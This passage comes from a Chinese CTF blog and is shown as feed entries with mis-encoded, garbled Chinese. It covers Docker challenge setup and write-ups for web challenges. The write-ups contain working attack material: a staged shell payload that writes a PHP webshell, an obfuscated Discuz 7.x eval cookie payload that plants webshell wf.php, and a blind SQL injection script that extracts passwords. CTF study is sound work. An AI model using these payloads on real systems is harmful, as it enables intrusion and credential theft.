class="bullet">-</span> <span class="string">&quot;2333:80&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>versionæŒ‡æ˜ymlæ–‡ä»¶çš„ç‰ˆæœ¬å·<br>serviceså°±æ˜¯ymlæ–‡ä»¶çš„ä¸»ä½“ï¼Œå®šä¹‰äº†æœåŠ¡äº†é…ç½®ã€‚bulidå°±æ˜¯åŸºäºdockerfileå¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œåé¢å°±æ˜¯dockerfileè·¯å¾„ï¼Œè¿™é‡Œä»£è¡¨dockerfileå’Œyamlæ–‡ä»¶åœ¨åŒä¸€è·¯å¾„ï¼Œenvironmentè¿™ä¸ªå°±æ˜¯å¼„åŠ¨æ€flagï¼Œè¿™é‡Œæˆ‘ä»¥åå¾€å¹³å°ä¸Šé¢˜å†å­¦ä¸€ä¸‹æ“ä½œï¼Œportsè¿™é‡Œ2333è¡¨ç¤ºæ˜ å°„çš„ç«¯å£ï¼Œ80è¿™é‡Œå’Œdockerfileè¦ä¸€æ ·</p></blockquote><p>è¿™æ ·ä¸€ä¸ªé¢˜ç›®æ­å»ºå°±åŸºæœ¬å®Œæˆäº†ï¼Œç„¶åå†å»æœåŠ¡å™¨è¿è¡Œdocker-compose.ymlæ–‡ä»¶å°±å¯ä»¥å¿«é€Ÿæ­å»ºé¢˜ç›®äº†<br><img src="https://s1.ax1x.com/2022/12/19/zLieKA.png" alt="zLieKA.png"><br>å¯ä»¥çœ‹åˆ°ç›´æ¥æ‰§è¡Œ<code>sudo  docker-compose up -d</code>å°±å¯ä»¥å¿«é€Ÿèµ·ä¸€ä¸ªç¯å¢ƒï¼Œè€Œä¸”è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªrce-web-1é•œåƒï¼Œå¹¶ä¸”è¿™é‡Œçœ‹åˆ°å®¹å™¨åˆ›å»ºæˆåŠŸ<br>è®¿é—®ä¸€ä¸‹ï¼Œçœ‹åˆ°é¢˜ç›®<br><img src="https://s1.ax1x.com/2022/12/19/zLiVvd.png" alt="zLiVvd.png"><br>æ‰“ä¸€ä¸‹<br>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;hp  </span><br><span class="line">&gt;1.p\\  </span><br><span class="line">&gt;d\&gt;\\  </span><br><span class="line">&gt;\ -\\  </span><br><span class="line">&gt;e64\\  </span><br><span class="line">&gt;bas\\  </span><br><span class="line">&gt;7\|\\  </span><br><span class="line">&gt;XSk\\  </span><br><span class="line">&gt;Fsx\\  </span><br><span class="line">&gt;dFV\\  </span><br><span class="line">&gt;kX0\\  </span><br><span class="line">&gt;bCg\\  </span><br><span class="line">&gt;XZh\\  </span><br><span class="line">&gt;AgZ\\  </span><br><span class="line">&gt;waH\\  </span><br><span class="line">&gt;PD9\\  </span><br><span class="line">&gt;o\ \\  </span><br><span class="line">&gt;ech\\  </span><br><span class="line">ls -t&gt;0  </span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨è„šæœ¬è‡ªåŠ¨æ‰§è¡Œï¼Œä½†æ˜¯ç½‘ä¸Šè„šæœ¬æˆ‘æ‰§è¡Œå‘ç°ä¸€å¥è¯å†™ä¸è¿›å»ï¼Œå¯èƒ½å“ªé‡Œæœ‰ç‚¹é—®é¢˜<br>ç›´æ¥æ‰‹åŠ¨å§<br>æˆåŠŸå†™å…¥<br><img src="https://s1.ax1x.com/2022/12/19/zLiA8e.png" alt="zLiA8e.png"><br>æ‹¿åˆ°flagï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯flag.phpçš„ä»£ç <br><img src="https://s1.ax1x.com/2022/12/19/zLii4O.png" alt="zLii4O.png"><br>ä¸çŸ¥é“ä¸ºä»€ä¹ˆèšå‰‘è¿ä¸ä¸Šï¼Œå¯èƒ½æ˜¯æˆ‘ç¯å¢ƒæœ‰é—®é¢˜ï¼Œä»¥åæ­å»ºæ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®å†ç»†ç»†ç ”ç©¶ä¸€ä¸‹</p>]]></content>
      
      
      <categories>
          
          <category> Doker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ æ­å»ºä¸€ä¸ªç®€å•é¢˜</title>
      <link href="/undefined/40470.html"/>
      <url>/undefined/40470.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³äºç”¨dockerå‡ºé¢˜çš„æ–‡ç« å®åœ¨æ˜¯å¤ªå°‘äº†ï¼Œæ‰€ä»¥è‡ªå·±åœ¨å­¦ä¹ çš„æ—¶å€™è®°å½•ä¸€ä¸‹<br>dockerçš„ä¸€äº›åŸºæœ¬æ­å»ºåœ¨è¿™é‡Œå°±ä¸ä¸€ä¸€è¯´æ˜äº†ï¼Œè¿™é‡Œåªè®°å½•ä¸€ä¸‹å¦‚ä½•æŠŠä¸€ä¸ªé¢˜ç›®å¼„å‡ºæ¥ï¼Œå¯èƒ½æœ‰äº›åœ°æ–¹ä¹Ÿæœ‰é”™è¯¯</p><h2 id="è¿›å…¥ä¸»é¢˜"><a href="#è¿›å…¥ä¸»é¢˜" class="headerlink" title="è¿›å…¥ä¸»é¢˜"></a>è¿›å…¥ä¸»é¢˜</h2><p>æŒ‰æˆ‘è‡ªå·±çš„ç†è§£å°±æ˜¯å…ˆæ‹‰å–ä¸€ä¸ªé•œåƒç”¨æ¥å¸ƒç½®é¢˜ç›®æ‰€éœ€çš„ç¯å¢ƒä»¥åŠå®¹å™¨æ‰€éœ€<br>æˆ‘è¿™é‡Œä½¿ç”¨<code>ctftraining/base_image_nginx_mysql_php_73</code> è¿™ä¸ªé•œåƒä¸€å¼€å§‹æˆ‘ç”¨çš„<code>tutum/lamp</code><br>ä½†æ˜¯å‘ç°è¿™ä¸ªé•œåƒæœ‰ç‚¹é—®é¢˜ä¸èƒ½æ˜¾ç¤ºä¸­æ–‡ï¼Œå¯èƒ½æ˜¯dockerfileæ²¡è®¾ç½®<br>æ‹‰å–é•œåƒ<code>docker pull ctftraining/base_image_nginx_mysql_php_73 </code><br>è¿™é‡Œæˆ‘å·²ç»æ‹‰å–äº†ï¼Œæ‰€ä»¥åˆ—ä¸€ä¸‹<br><img src="https://s1.ax1x.com/2022/12/15/zo0fQs.png" alt="zo0fQs.png"><br>ç„¶åä½¿ç”¨ctftraining&#x2F;base_image_nginx_mysql_php_73é•œåƒå¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼ŒåŒæ—¶æ˜ å°„åˆ°æœåŠ¡å™¨çš„2333ç«¯å£<br><code> docker run -d -p 2333:80 ctftraining/base_image_nginx_mysql_php_73</code><br><img src="https://s1.ax1x.com/2022/12/15/zo0Rzj.png" alt="zo0Rzj.png"><br>å¯ä»¥çœ‹åˆ°å·²ç»å¯åŠ¨äº†ä¸€ä¸ªå®¹å™¨ï¼Œç„¶åå°±æ˜¯å¼„å‡ºé¢˜æ–‡ä»¶äº†ï¼Œå…ˆä¸Šä¼ åˆ°æœåŠ¡å™¨çš„&#x2F;var&#x2F;www&#x2F;htmlä¸‹<br>ä¸€ä¸ªç®€å•çš„æŠ“åŒ…æŸ¥çœ‹æºç çš„é¢˜ï¼Œå› ä¸ºä¸»è¦æ˜¯å­¦ä¹ æ€ä¹ˆå¸ƒç½®ä¸€ä¸ªé¢˜ç›®ï¼Œæ‰€ä»¥ç›´æ¥åˆ°ç½‘ä¸Šæ‰¾çš„ä¸€ä¸ªæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;p style=<span class="string">&quot;font-family:arial;color:black;font-size:20px;text-align:center;&quot;</span>&gt;Flagä¸åœ¨è¿™é‡Œå“¦&lt;/p&gt;  </span><br><span class="line">&lt;!-- flag&#123;This_is_flag&#125; --&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;script&gt;  </span><br><span class="line"> document.oncontextmenu=<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">   <span class="title function_ invoke__">alert</span>(<span class="string">&quot;å³é”®è¢«ç¦ç”¨&quot;</span>);  </span><br><span class="line">   <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">  &#125;;  </span><br><span class="line"> document.onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;  </span><br><span class="line">    e = window.event || e;  </span><br><span class="line">    <span class="keyword">var</span> k = e.keyCode;  </span><br><span class="line">    <span class="comment">//å±è”½ctrl+uï¼ŒF12é”®  </span></span><br><span class="line">    <span class="keyword">if</span> ((e.ctrlKey == <span class="literal">true</span> &amp;&amp; k == <span class="number">85</span>) || k == <span class="number">123</span>) &#123;  </span><br><span class="line">      <span class="keyword">if</span> (k == <span class="number">85</span>)  </span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;Ctrl+Uè¢«ç¦ç”¨!&quot;</span>);  </span><br><span class="line">      <span class="keyword">else</span>   </span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;F12è¢«ç¦ç”¨!&quot;</span>);  </span><br><span class="line">      e.keyCode = <span class="number">0</span>;  </span><br><span class="line">      e.returnValue = <span class="literal">false</span>;  </span><br><span class="line">      e.cancelBubble = <span class="literal">true</span>;  </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> &#125;  </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæŠŠé¢˜ç›®çš„æºç ä»æœåŠ¡å™¨copyåˆ°å®¹å™¨ä¸­<br><code>docker cp /var/www/html/index.php 603788:/var/www/html/</code><br>å®¹å™¨idä¸ç”¨å†™å…¨åªè¦èƒ½è¯†åˆ«å‡ºæ¥å°±è¡Œï¼Œæ‰§è¡Œä¹‹åè®¿é—®å°±è¡Œ<br>è®¿é—®<code>æœåŠ¡å™¨ip:2333</code><br><img src="https://s1.ax1x.com/2022/12/15/zo02WQ.png" alt="zo02WQ.png"><br>å¸ƒç½®æˆåŠŸ<br><img src="https://s1.ax1x.com/2022/12/15/zo0cFS.png" alt="zo0cFS.png"><br>ç„¶åæŠ“åŒ…å¾—åˆ°flag<br><img src="https://s1.ax1x.com/2022/12/15/zo0gJg.png" alt="zo0gJg.png"><br>ç„¶åå°±æ˜¯dockerfileå’Œdocker-compose.ymlçš„ç¼–å†™ï¼Œç”¨æ¥å¿«é€Ÿæœ¬åœ°éƒ¨ç½²å’ŒåŠ¨æ€flagå®ç°ç­‰ï¼Œè¿™é‡Œå°±å…ˆä¸å†™äº†,å½“ç„¶é‚£ä¸ªä¹Ÿæ˜¯å¾ˆé‡è¦çš„ä¸œè¥¿<br>æœ€åè¿™é‡Œåˆ—ä¸€ä¸‹æˆ‘æœ€è¿‘ç»å¸¸ç”¨çš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exit //é€€å‡ºå®¹å™¨</span><br><span class="line">systemctl restart docker  //é‡å¯docker</span><br><span class="line">docker start å®¹å™¨id  //å¼€å¯ä¸€ä¸ªå·²çŸ¥idçš„å®¹å™¨</span><br><span class="line">docker restart å®¹å™¨id  //é‡æ–°å¯åŠ¨å®¹å™¨</span><br><span class="line">docker exec -it  å®¹å™¨id bash  //é€€å‡ºå®¹å™¨åå®¹å™¨ä¸å…³é—­</span><br><span class="line">docker stop å®¹å™¨id  //ç»“æŸå®¹å™¨</span><br><span class="line">docker ps  //æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span><br><span class="line">docker image ls  //æŸ¥çœ‹é•œåƒç›®å½•</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<br><a href="https://blog.csdn.net/Cypher_X/article/details/115359957">CTF Webå‡ºé¢˜æ„Ÿæ‚Ÿ_Wuuconixçš„åšå®¢-CSDNåšå®¢_ctf webå‡ºé¢˜</a><br><a href="https://blog.csdn.net/m0_62422842/article/details/126604577?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-126604577-blog-115359957.pc_relevant_multi_platform_whitelistv4&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-126604577-blog-115359957.pc_relevant_multi_platform_whitelistv4&utm_relevant_index=5">ç”¨dockeræ­å»ºç®€æ˜“ctfé¢˜ç›®_XiLitterçš„åšå®¢-CSDNåšå®¢_ctfé¢˜ç›®docker</a></p>]]></content>
      
      
      <categories>
          
          <category> Doker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¼±å£ä»¤æ‹›æ–°èµ›wp(éƒ¨åˆ†)</title>
      <link href="/undefined/53909.html"/>
      <url>/undefined/53909.html</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ç­¾åˆ°å°èƒ½æ‰‹"><a href="#ç­¾åˆ°å°èƒ½æ‰‹" class="headerlink" title="ç­¾åˆ°å°èƒ½æ‰‹"></a>ç­¾åˆ°å°èƒ½æ‰‹</h2><p>ç›´æ¥æ‰«ç›®å½•å‘ç°æœ‰ä¸ªindex.php.bakä¸‹è½½æ‰“å¼€å¾—åˆ°</p><h2 id="å¼€èƒƒèœ"><a href="#å¼€èƒƒèœ" class="headerlink" title="å¼€èƒƒèœ"></a>å¼€èƒƒèœ</h2><p>lsæ ¹ç›®å½•çœ‹åˆ°flag<br><img src="https://s1.ax1x.com/2022/11/19/zuy5qO.png" alt="zuy5qO.png"><br>ç„¶åcatï¼Œè¿™é‡Œå¥½åƒå¯ä»¥å¿½ç•¥ç©ºæ ¼ï¼Œå¯èƒ½æ˜¯éé¢„æœŸå§ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ç”¨nlç›´æ¥å‡ºæ¥<br><img src="https://s1.ax1x.com/2022/11/19/zuy4sK.png" alt="zuy4sK.png"></p><h2 id="å°é•‡åšé¢˜å®¶"><a href="#å°é•‡åšé¢˜å®¶" class="headerlink" title="å°é•‡åšé¢˜å®¶"></a>å°é•‡åšé¢˜å®¶</h2><p>æ‰«å‡ºæ¥robots.txtï¼Œè®¿é—®&#x2F;GAME&#x2F;index.htmlæŸ¥çœ‹jsä»£ç <br><img src="https://s1.ax1x.com/2022/11/19/zuyWxx.png" alt="zuyWxx.png"><br>base64è§£ç è®¿é—®&#x2F;GAME&#x2F;f14g_in_there_hha&#x2F;index.php<br>ç„¶åGAME&#x2F;f14g_in_there_hha&#x2F;index.php?payload&#x3D;;cat%09&#x2F;*</p><h2 id="Discuz"><a href="#Discuz" class="headerlink" title="Discuz"></a>Discuz</h2><p>å‚è€ƒè¿™ç¯‡æ–‡ç« (<a href="https://cloud.tencent.com/developer/article/1541130">Discuz 7.x&#x2F;6.x å…¨å±€å˜é‡é˜²å¾¡ç»•è¿‡å¯¼è‡´ä»£ç æ‰§è¡Œæ¼æ´å¤ç° - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a>)<br>ç›´æ¥è®¿é—®å­˜åœ¨æ¼æ´çš„åœ°æ–¹ä½†æ˜¯åœ¨tidè¿™é‡Œå›°äº†å¾ˆä¹…<br><img src="https://s1.ax1x.com/2022/11/19/zuyhM6.png" alt="zuyhM6.png"><br>ç„¶åä¸€ç›´æ‰¾ç»ˆäºåˆæ‰¾åˆ°ä¸€ç¯‡åšå®¢(<a href="https://www.freebuf.com/vuls/262488.html">discuz7.2æ¼æ´å¤ç°â€“pythonç¼–å†™poc - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a>)</p><p><img src="https://s1.ax1x.com/2022/11/19/zuyRR1.png" alt="zuyRR1.png"></p><p>ç›´æ¥tidæ”¹ä¸º10ï¼Œè¿æ°”ä¸é”™æ‹¿åˆ°shell<br><img src="https://s1.ax1x.com/2022/11/19/zuyTde.png" alt="zuyTde.png"><br>æ¥ä¸‹æ¥æŠŠwebshellå†™å…¥ï¼Œpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(119).Chr(102).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(108).Chr(97).Chr(108).Chr(97).Chr(108).Chr(97).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))</span><br></pre></td></tr></table></figure><p>åŒæ ·ä¼ ç»™cookieï¼Œè¿™é‡Œæ˜¯åˆ›å»ºäº†ä¸€ä¸ªwf.phpå¯†ç ä¸ºlalalalï¼Œè®¿é—®ä¸€ä¸‹è¿™ä¸ªç•Œé¢<br><img src="https://s1.ax1x.com/2022/11/19/zuyoZD.png" alt="zuyoZD.png"><br>æ²¡æœ‰æŠ¥é”™è¯´æ˜å†™å…¥æˆåŠŸï¼Œèšå‰‘è¿ä¸Šç»ˆç«¯catå°±è¡Œ<br><img src="https://s1.ax1x.com/2022/11/19/zucTCd.png" alt="zucTCd.png"></p><h2 id="Queen"><a href="#Queen" class="headerlink" title="Queen"></a>Queen</h2><p>è¿™ä¸ªé¢˜æ¯”èµ›æ—¶æ²¡å¼„å‡ºæ¥ï¼Œlimitæ³¨å…¥ä¸å¤ªç†Ÿæ‚‰</p><p><img src="https://s1.ax1x.com/2022/11/19/zu2uTS.png" alt="zu2uTS.png"><br>éœ€è¦ä¼ªé€ ipç”¨X-Forwarded-For:127.0.0.1æ¥ä¼ªé€ <br><img src="https://s1.ax1x.com/2022/11/19/zucbvt.png" alt="zucbvt.png"><br>ä½†æ˜¯è·³è½¬åˆ°302äº†å¹¶ä¸”ç™»å½•å¤±è´¥ï¼Œæœ€åç”¨limitæ‰¾åˆ°æ³¨å…¥ç‚¹<br><img src="https://s1.ax1x.com/2022/11/19/zuc78A.png" alt="zuc78A.png"><br><img src="https://s1.ax1x.com/2022/11/19/zucI4H.png" alt="zucI4H.png"><br>ç›²æ³¨å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">  </span><br><span class="line">url = <span class="string">&#x27;http://d9960516-2ae7-4792-806e-90afce237a56.recruit.qsnctf.com:8080/login.php&#x27;</span>  </span><br><span class="line">headers = &#123;  </span><br><span class="line">    <span class="string">&quot;x-forwarded-for&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">payload=<span class="string">&#x27;&#x27;&#x27;or (ascii(substr((select(group_concat(Password))from(user)),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#&#x27;&#x27;&#x27;</span>  </span><br><span class="line"><span class="comment">#or (ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#  </span></span><br><span class="line"><span class="comment">#or (ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;user&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#  </span></span><br><span class="line"><span class="comment">#or (ascii(substr((select(group_concat(Password))from(user)),&#123;&#125;,1))&gt;&#123;&#125;) limit 1#  </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  </span><br><span class="line">    <span class="built_in">print</span>(i)  </span><br><span class="line">    left = <span class="number">32</span>  </span><br><span class="line">    right = <span class="number">127</span>  </span><br><span class="line">    mid = (left + right) // <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">while</span> left &lt; right:  </span><br><span class="line">        payload_flag=payload.<span class="built_in">format</span>(i,mid)  </span><br><span class="line">        data = &#123;  </span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;\\&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;password&quot;</span>: payload_flag  </span><br><span class="line">        &#125;  </span><br><span class="line">        r = requests.post(headers=headers, url=url, data=data, allow_redirects=<span class="literal">True</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ç™»é™†æˆåŠŸ&quot;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            left = mid + <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            right = mid  </span><br><span class="line">        mid = (left + right) // <span class="number">2</span>  </span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">127</span> <span class="keyword">or</span> mid == <span class="number">32</span>:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">    flag += <span class="built_in">chr</span>(right)  </span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2022/11/19/zu2cm6.png" alt="zu2cm6.png"></p><p>è¿™ä¸ªè„šæœ¬æœ‰ç‚¹é—®é¢˜ï¼Œåªæœ‰çˆ†flagçš„payloadæœ‰ç”¨ï¼Œå…¶å®ƒçš„ä¸å®Œæ•´ï¼Œåé¢å¤ç°å†æ¥æ”¹æ”¹</p><h2 id="Where"><a href="#Where" class="headerlink" title="Where"></a>Where</h2><p>ç›´æ¥æ‰«ç›®å½•æœ‰ä¸ªadminï¼Œç„¶åç™»å½•ï¼Œçœ‹æºç å‘ç°éªŒè¯ç æ˜¯å›¾ç‰‡ï¼Œé‚£ä¹ˆåº”è¯¥ä¸æ˜¯è¿›å…¥åå°äº†ï¼Œåœ¨urlä¸Šé¢å‘ç°base64åŠ å¯†çš„ä¸œè¥¿è§£ç ä¸€ä¸‹<br><img src="https://s1.ax1x.com/2022/11/19/zu2OAS.png" alt="zu2OAS.png"><br>åœ¨è¿™ä¸ªç›®å½•ä¸‹ä½†æ˜¯å®ƒæ˜¯ä¸å¯è®¿é—®çš„ï¼Œäºæ˜¯è¯•äº†ä¸€ç³»åˆ—ç»•è¿‡ç»“æœä¸è¡Œï¼Œ<br><img src="https://s1.ax1x.com/2022/11/19/zucLKP.png" alt="zucLKP.png"><br>çœ‹åˆ°è¿™ä¸ªç›®å½•æœ‰ä¸ªevalå‡½æ•°å¯èƒ½æœ‰é—®é¢˜ï¼Œæœä¸å…¶ç„¶(<a href="https://blog.csdn.net/weixin_43416469/article/details/114157361">PHPUnitè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2017-9841 æ¼æ´å¤ç°_ADummy_çš„åšå®¢-CSDNåšå®¢</a>)<br>è¿™é‡Œæœ¨é©¬æ˜¯å†™ä¸è¿›å»çš„ï¼Œç›´æ¥æ‰§è¡Œphpinfoç„¶åæœç´¢flag<br><img src="https://s1.ax1x.com/2022/11/19/zucHgI.png" alt="zucHgI.png"><br>æäº¤æ˜¯å‡flagç¦»äº†ä¸ªå¤§è°±ï¼Œç„¶åå›å»catä¸€ä¸‹å‡ºæ¥äº†<br><img src="https://s1.ax1x.com/2022/11/19/zucODf.png" alt="zucODf.png"></p><h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><p>ä¸€å¼€å§‹æ‰¾äº†è¿™ä¸ªWeblogicçš„SSRFæ¼æ´ä½†æ˜¯å†…ç½‘ipä¸€ç›´å¼„ä¸å‡ºæ¥ï¼Œæ¢æ€è·¯å‘ç°å¥½åƒä¸æ˜¯è¿™ä¸ªæ´<br>(<a href="https://blog.csdn.net/yumengzth/article/details/97522783">https://blog.csdn.net/yumengzth/article/details/97522783</a>)<br>å‚è€ƒè¿™ä¸ªï¼Œåˆ©ç”¨å·¥å…·å‡ºæ¥<br><img src="https://s1.ax1x.com/2022/11/19/zucxUg.png" alt="zucxUg.png"></p><p>å¾ˆé—æ†¾æœ€ç»ˆæ²¡èƒ½è¿›å…¥å‰30</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022SWPUæœªè§£é¢˜å¤ç°</title>
      <link href="/undefined/43696.html"/>
      <url>/undefined/43696.html</url>
      
        <content type="html"><![CDATA[<h2 id="Funny-web"><a href="#Funny-web" class="headerlink" title="Funny_web"></a>Funny_web</h2><p>è¿™ä¸ªé¢˜ä¸€å¼€å§‹å°±æ²¡åšï¼Œä¸çŸ¥é“è´¦å·å’Œå¯†ç ç®—æ˜¯ä»–ä»¬å†…éƒ¨é¢˜å§</p><p><img src="https://s1.ax1x.com/2022/11/08/xzm2WT.md.png" alt="xzm2WT.md.png"></p><p>ç„¶åè¿›å»ä¹‹åçœ‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];  </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="string">&#x27;12345&#x27;</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) == <span class="string">&#x27;12345&#x27;</span>) &#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¿™ä¸ºä½•ç›¸ç­‰åˆä¸ç›¸ç­‰&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘å¡äº†ä¸€ä¸‹ä¸€ç›´åœ¨çº ç»“<code>intval</code>è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯è¿™é‡Œå…¶å®ä¸æ˜¯è€ƒè¿™ä¸ªå‡½æ•°è€Œæ˜¯è€ƒPHPå¼±æ¯”è¾ƒ<br>æ‰€ä»¥payloadï¼š<code>?num=12345a</code><br><img src="https://s1.ax1x.com/2022/11/08/xzmWSU.md.png" alt="xzmWSU.md.png"></p><h2 id="where-am-i"><a href="#where-am-i" class="headerlink" title="where_am_i"></a>where_am_i</h2><p>è¿™ä¸ªé¢˜é‚£å¼ 